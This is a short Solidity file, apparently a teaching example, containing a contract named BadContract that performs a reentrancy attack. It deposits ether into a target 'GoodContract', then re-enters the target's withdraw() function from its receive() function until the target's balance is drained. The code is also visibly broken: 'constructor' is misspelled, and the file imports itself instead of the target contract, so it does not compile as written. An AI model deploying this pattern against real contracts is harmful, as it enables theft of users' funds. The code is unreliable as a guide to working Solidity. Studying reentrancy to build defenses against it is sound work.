// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./BadContract";

contract BadContract {
    GoodContract public goodContract; // Creating an instance of the goodContract for use.

    constuctor(address _goodContractAddress) { // Passing in the constructor arguments.
        goodContract = GoodContract(_goodContractAddress);
    }

    receive() external payable {
        if(address(goodContract).balance > 0) { // If the goodContract's balance is more than zero - call the goodContract.withdraw() function.
            goodContract.withdraw();
        }
    }

    function attack() public payable { // This will start the attack by adding balance, then withdrawing funds.
        goodContract.addBalance{value:msg.value}();
        goodContract.withdraw();
    }
}